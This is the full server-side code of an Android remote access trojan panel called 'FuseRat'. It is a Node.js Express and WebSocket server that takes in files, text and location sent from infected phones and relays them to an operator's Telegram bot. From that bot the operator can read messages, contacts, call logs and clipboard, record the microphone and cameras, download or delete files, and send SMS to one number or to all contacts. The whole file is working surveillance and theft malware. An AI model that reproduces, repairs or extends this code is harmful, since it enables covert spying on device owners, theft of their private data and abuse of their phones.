const express = require("express");
const webSocket = require("ws");
const http = require("http");
const telegramBot = require("node-telegram-bot-api");
const uuid4 = require("uuid");
const multer = require("multer");
const bodyParser = require("body-parser");
const axios = require("axios");
require("dotenv").config();

const token = process.env.TOKEN;
const id = process.env.ID;

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({
  "server": appServer
});
const appBot = new telegramBot(token, {
  "polling": true
});
const appClients = new Map();
const upload = multer();

// FIX 8: Add 50MB limit for heavy payloads
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// FIX 5: Use per-chat session instead of global currentUuid
const userSessions = new Map();

let currentNumber = '';
let currentTitle = '';

app.get("/", function (_0x1b89da, _0x3398a0) {
  _0x3398a0.send("<h1 align=\"center\">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>");
});

// FIX 2 & 3 & 4: Remove Multer, use bodyParser, decode Base64, extract filename
app.post("/uploadFile", function (_0x1c67cf, _0x143a37) {
  try {
    const fileContentBase64 = _0x1c67cf.body.file_content;
    const fullFilePath = _0x1c67cf.body.filename || "unknown_file.jpg";
    const model = _0x1c67cf.headers.model || "Unknown";

    if (!fileContentBase64) {
      _0x143a37.status(400).send('');
      return;
    }

    // Extract filename from absolute path (e.g. /sdcard/DCIM/image.jpg -> image.jpg)
    const fileName = fullFilePath.split('/').pop() || "downloaded_file";

    // Decode Base64 to binary Buffer
    const fileBuffer = Buffer.from(fileContentBase64, 'base64');

    appBot.sendDocument(id, fileBuffer, {
      "caption": "°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>" + model + "</b> 𝙙𝙚𝙫𝙞𝙘𝙚",
      "parse_mode": "HTML"
    }, {
      "filename": fileName,
      "contentType": "application/octet-stream"
    });
    _0x143a37.send('');
  } catch (err) {
    console.error("[uploadFile] Error:", err.message);
    _0x143a37.status(500).send('');
  }
});

app.post("/uploadText", function (_0x5a02f5, _0x55205a) {
  appBot.sendMessage(id, "°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>" + _0x5a02f5.headers.model + "</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n" + _0x5a02f5.body.text, {
    "parse_mode": "HTML"
  });
  _0x55205a.send('');
});

app.post("/uploadLocation", function (_0xfc380d, _0x48b391) {
  appBot.sendLocation(id, _0xfc380d.body.lat, _0xfc380d.body.lon);
  appBot.sendMessage(id, "°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>" + _0xfc380d.headers.model + "</b> 𝙙𝙚𝙫𝙞𝙘𝙚", {
    "parse_mode": "HTML"
  });
  _0x48b391.send('');
});

appSocket.on("connection", function (_0x466cd0, _0x1cf0ae) {
  const _0x275c2d = uuid4.v4();
  const _0x2cfd1d = _0x1cf0ae.headers.model;
  const _0x5409ca = _0x1cf0ae.headers.battery;
  const _0x4a1a34 = _0x1cf0ae.headers.version;
  const _0x340b05 = _0x1cf0ae.headers.brightness;
  const _0x1dd883 = _0x1cf0ae.headers.provider;
  
  _0x466cd0.uuid = _0x275c2d;
  appClients.set(_0x275c2d, {
    "model": _0x2cfd1d,
    "battery": _0x5409ca,
    "version": _0x4a1a34,
    "brightness": _0x340b05,
    "provider": _0x1dd883,
    "socket": _0x466cd0
  });

  appBot.sendMessage(id, "°• NEW DEVICE IS CONNECTED, DEVELOPED BY @MOGATEAM & @shivayadavv\n\n" + 
    ("• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>" + _0x2cfd1d + "</b>\n") + 
    ("• ʙᴀᴛᴛᴇʀʏ : <b>" + _0x5409ca + "</b>\n") + 
    ("• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>" + _0x4a1a34 + "</b>\n") + 
    ("• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>" + _0x340b05 + "</b>\n") + 
    ("• ᴘʀᴏᴠɪᴅᴇʀ : <b>" + _0x1dd883 + "</b>"), {
    "parse_mode": "HTML"
  });

  _0x466cd0.on("close", function () {
    appBot.sendMessage(id, "°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙, DEVELOPED BY @MOGATEAM & @shivayadavv\n\n" + 
      ("• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>" + _0x2cfd1d + "</b>\n") + 
      ("• ʙᴀᴛᴛᴇʀʏ : <b>" + _0x5409ca + "</b>\n") + 
      ("• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>" + _0x4a1a34 + "</b>\n") + 
      ("• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>" + _0x340b05 + "</b>\n") + 
      ("• ᴘʀᴏᴠɪᴅᴇʀ : <b>" + _0x1dd883 + "</b>"), {
      "parse_mode": "HTML"
    });
    // FIX 6: Correct Map delete syntax
    appClients.delete(_0x466cd0.uuid);
    
    // Clean up sessions for this UUID
    for (let [chatId, targetUuid] of userSessions.entries()) {
      if (targetUuid === _0x466cd0.uuid) {
        userSessions.delete(chatId);
      }
    }
  });
});

// FIX 5 & 7: Helper function to send command to selected device
function sendToClient(chatId, payload) {
  const targetUuid = userSessions.get(chatId);
  if (!targetUuid) {
    appBot.sendMessage(chatId, "❌ No device selected. Please select a device first.");
    return false;
  }

  const client = appClients.get(targetUuid);
  if (!client || !client.socket || client.socket.readyState !== webSocket.OPEN) {
    appBot.sendMessage(chatId, "❌ Device disconnected. Please reconnect.");
    userSessions.delete(chatId);
    return false;
  }

  client.socket.send(payload);
  return true;
}

appBot.on("message", function (_0x2ca88f) {
  const _0x32d1ff = _0x2ca88f.chat.id;
  if (String(_0x32d1ff) !== String(id)) {
    appBot.sendMessage(id, "°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙");
    return;
  }

  if (_0x2ca88f.reply_to_message) {
    const replyText = _0x2ca88f.reply_to_message.text || "";

    // SMS number
    if (replyText.includes("°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧")) {
      currentNumber = _0x2ca88f.text;
      appBot.sendMessage(id, "°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚", {
        "reply_markup": { "force_reply": true }
      });
      return;
    }

    // SMS message
    if (replyText.includes("°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚")) {
      const targetUuid = userSessions.get(_0x32d1ff);
      if (targetUuid) {
        appSocket.clients.forEach(function (_0x465249) {
          if (_0x465249.uuid == targetUuid) {
            _0x465249.send("send_message:" + currentNumber + "/" + _0x2ca88f.text);
          }
        });
      }
      currentNumber = '';
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
      return;
    }

    // Send to all contacts
    if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡")) {
      const msgText = _0x2ca88f.text;
      const targetUuid = userSessions.get(_0x32d1ff);
      if (targetUuid) {
        appSocket.clients.forEach(function (_0x3a189f) {
          if (_0x3a189f.uuid == targetUuid) {
            _0x3a189f.send("send_message_to_all:" + msgText);
          }
        });
      }
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
      return;
    }

    // FIX 1 & 7: Strictly use "explore:" and "download:" commands
    // File Explore Path
    if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙩𝙤 𝙚𝙭𝙥𝙡𝙤𝙧𝙚")) {
      const path = _0x2ca88f.text.trim();
      if (!path || path.length < 2) {
        appBot.sendMessage(id, "❌ Invalid path. Use /sdcard");
        return;
      }
      if (sendToClient(_0x32d1ff, "explore:" + path)) {
        appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨", {
          "parse_mode": "HTML",
          "reply_markup": {
            "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
            "resize_keyboard": true
          }
        });
      }
      return;
    }

    // File Download Path (Strictly "download:", not "file:")
    if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙")) {
      const path = _0x2ca88f.text.trim();
      if (!path || path.length < 2) {
        appBot.sendMessage(id, "❌ Invalid file path. Example: /sdcard/DCIM/image.jpg");
        return;
      }
      if (sendToClient(_0x32d1ff, "download:" + path)) {
        appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨", {
          "parse_mode": "HTML",
          "reply_markup": {
            "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
            "resize_keyboard": true
          }
        });
      }
      return;
    }

    // Legacy file (kept for backward compatibility)
    if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙")) {
      const path = _0x2ca88f.text;
      const targetUuid = userSessions.get(_0x32d1ff);
      if (targetUuid) {
        appSocket.clients.forEach(function (_0x1bb0ba) {
          if (_0x1bb0ba.uuid == targetUuid) {
            _0x1bb0ba.send("file:" + path);
          }
        });
      }
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
      return;
    }

    // Delete file
    if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚")) {
      const path = _0x2ca88f.text;
      const targetUuid = userSessions.get(_0x32d1ff);
      if (targetUuid) {
        appSocket.clients.forEach(function (_0x4e86bf) {
          if (_0x4e86bf.uuid == targetUuid) {
            _0x4e86bf.send("delete_file:" + path);
          }
        });
      }
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
      return;
    }

    // Other legacy commands (microphone, camera, toast, notification, audio)
    if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜")) {
      const val = _0x2ca88f.text;
      const targetUuid = userSessions.get(_0x32d1ff);
      if (targetUuid) {
        appSocket.clients.forEach(function (ws) {
          if (ws.uuid == targetUuid) {
            if (replyText.includes("𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚")) ws.send("microphone:" + val);
            else if (replyText.includes("𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖")) ws.send("rec_camera_main:" + val);
            else if (replyText.includes("𝙎𝙚𝙡𝙛𝙞𝙚")) ws.send("rec_camera_selfie:" + val);
          }
        });
      }
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
      return;
    }

    if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧")) {
      const val = _0x2ca88f.text;
      const targetUuid = userSessions.get(_0x32d1ff);
      if (targetUuid) {
        appSocket.clients.forEach(function (ws) {
          if (ws.uuid == targetUuid) ws.send("toast:" + val);
        });
      }
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
      return;
    }

    if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣")) {
      currentTitle = _0x2ca88f.text;
      appBot.sendMessage(id, "°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠", {
        "reply_markup": { "force_reply": true }
      });
      return;
    }

    if (replyText.includes("°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠")) {
      const link = _0x2ca88f.text;
      const targetUuid = userSessions.get(_0x32d1ff);
      if (targetUuid) {
        appSocket.clients.forEach(function (ws) {
          if (ws.uuid == targetUuid) {
            ws.send("show_notification:" + currentTitle + "/" + link);
          }
        });
      }
      currentTitle = '';
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
      return;
    }

    if (replyText.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠")) {
      const link = _0x2ca88f.text;
      const targetUuid = userSessions.get(_0x32d1ff);
      if (targetUuid) {
        appSocket.clients.forEach(function (ws) {
          if (ws.uuid == targetUuid) ws.send("play_audio:" + link);
        });
      }
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
      return;
    }
  }

  // Non-reply commands
  if (id == _0x32d1ff) {
    if (_0x2ca88f.text == "/start") {
      appBot.sendMessage(id, "°• °• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 Fuse𝙍𝙖𝙩 𝙥𝙖𝙣𝙚𝙡\n\n• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n• ᴄʟɪᴄᴋ 'Execute command' ᴛᴏ ꜱᴇʟᴇᴄᴛ ᴅᴇᴠɪᴄᴇ", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
    }
    if (_0x2ca88f.text == "𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨") {
      if (appClients.size == 0) {
        appBot.sendMessage(id, "°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨");
      } else {
        let _0x31005f = "°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n";
        appClients.forEach(function (_0x3c015b) {
          _0x31005f += "• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>" + _0x3c015b.model + "</b>\n" +
            ("• ʙᴀᴛᴛᴇʀʏ : <b>" + _0x3c015b.battery + "</b>\n") +
            ("• ᴀɴᴅʀᴏɪᴅ : <b>" + _0x3c015b.version + "</b>\n\n");
        });
        appBot.sendMessage(id, _0x31005f, { "parse_mode": "HTML" });
      }
    }
    if (_0x2ca88f.text == "𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙") {
      if (appClients.size == 0) {
        appBot.sendMessage(id, "°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨");
      } else {
        const _0x118a77 = [];
        appClients.forEach(function (_0x4ed698, _0x52dcb4) {
          _0x118a77.push([{
            "text": _0x4ed698.model,
            "callback_data": "device:" + _0x52dcb4
          }]);
        });
        appBot.sendMessage(id, "°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚", {
          "reply_markup": { "inline_keyboard": _0x118a77 }
        });
      }
    }
  }
});

appBot.on("callback_query", function (_0x425827) {
  const _0x440ba5 = _0x425827.message;
  const _0x9f09ec = _0x425827.data;
  const _0x2f3f8b = _0x9f09ec.split(":")[0];
  const _0x39894d = _0x9f09ec.split(":")[1];
  const chatId = _0x440ba5.chat.id;

  if (_0x2f3f8b == "device") {
    // FIX 5: Store session for this chat ID
    userSessions.set(chatId, _0x39894d);
    
    const device = appClients.get(_0x39894d);
    if (!device) {
      appBot.answerCallbackQuery(_0x425827.id, { text: "Device not found" });
      return;
    }

    appBot.editMessageText("°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>" + device.model + "</b>", {
      "chat_id": id,
      "message_id": _0x440ba5.message_id,
      "reply_markup": {
        "inline_keyboard": [
          [{ "text": "𝘼𝙥𝙥𝙨", "callback_data": "apps:" + _0x39894d }, { "text": "𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤", "callback_data": "device_info:" + _0x39894d }],
          [{ "text": "𝙂𝙚𝙩 𝙛𝙞𝙡𝙚", "callback_data": "file:" + _0x39894d }, { "text": "𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚", "callback_data": "delete_file:" + _0x39894d }],
          [{ "text": "𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙", "callback_data": "clipboard:" + _0x39894d }, { "text": "𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚", "callback_data": "microphone:" + _0x39894d }],
          [{ "text": "𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖", "callback_data": "camera_main:" + _0x39894d }, { "text": "𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖", "callback_data": "camera_selfie:" + _0x39894d }],
          [{ "text": "𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣", "callback_data": "location:" + _0x39894d }, { "text": "𝙏𝙤𝙖𝙨𝙩", "callback_data": "toast:" + _0x39894d }],
          [{ "text": "𝘾𝙖𝙡𝙡𝙨", "callback_data": "calls:" + _0x39894d }, { "text": "𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨", "callback_data": "contacts:" + _0x39894d }],
          [{ "text": "𝙑𝙞𝙗𝙧𝙖𝙩𝙚", "callback_data": "vibrate:" + _0x39894d }, { "text": "𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣", "callback_data": "show_notification:" + _0x39894d }],
          [{ "text": "𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨", "callback_data": "messages:" + _0x39894d }, { "text": "𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚", "callback_data": "send_message:" + _0x39894d }],
          [{ "text": "𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤", "callback_data": "play_audio:" + _0x39894d }, { "text": "𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤", "callback_data": "stop_audio:" + _0x39894d }],
          [{ "text": "𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡", "callback_data": "send_message_to_all:" + _0x39894d }],
          // NEW FILE EXPLORE & DOWNLOAD BUTTONS
          [{ "text": "𝙁𝙞𝙡𝙚 𝙀𝙭𝙥𝙡𝙤𝙧𝙚", "callback_data": "explore:" + _0x39894d }, { "text": "𝘿𝙤𝙬𝙣𝙡𝙤𝙖𝙙", "callback_data": "download_file:" + _0x39894d }]
        ]
      },
      "parse_mode": "HTML"
    });
    appBot.answerCallbackQuery(_0x425827.id);
    return;
  }

  // Explore prompt (FIX 1 & 7)
  if (_0x2f3f8b == "explore") {
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, 
      "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙩𝙤 𝙚𝙭𝙥𝙡𝙤𝙧𝙚\n\n• ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ <b>/sdcard</b>", 
      { "reply_markup": { "force_reply": true }, "parse_mode": "HTML" }
    );
    appBot.answerCallbackQuery(_0x425827.id);
    return;
  }

  // Download prompt (FIX 1 & 7)
  if (_0x2f3f8b == "download_file") {
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, 
      "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n• ᴇxᴀᴍᴘʟᴇ: <b>/sdcard/DCIM/image.jpg</b>", 
      { "reply_markup": { "force_reply": true }, "parse_mode": "HTML" }
    );
    appBot.answerCallbackQuery(_0x425827.id);
    return;
  }

  // Direct commands
  const directActions = ["apps", "device_info", "file", "delete_file", "clipboard", 
                         "camera_main", "camera_selfie", "location", "toast", "calls", 
                         "contacts", "vibrate", "show_notification", "messages", 
                         "send_message", "send_message_to_all", "play_audio", "stop_audio"];
  
  if (directActions.includes(_0x2f3f8b)) {
    appBot.deleteMessage(id, _0x440ba5.message_id);
    if (sendToClient(chatId, _0x2f3f8b + ":")) {
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
    }
    appBot.answerCallbackQuery(_0x425827.id);
    return;
  }
});

// FIX 9: Optimized ping loop – removed blocking axios Google ping
setInterval(function () {
  try {
    appSocket.clients.forEach(function (_0x41c8f7) {
      if (_0x41c8f7.readyState === webSocket.OPEN) {
        _0x41c8f7.send("ping");
      }
    });
  } catch (err) {
    // Silently ignore
  }
}, 30000);

appServer.listen(process.env.PORT || 8999);
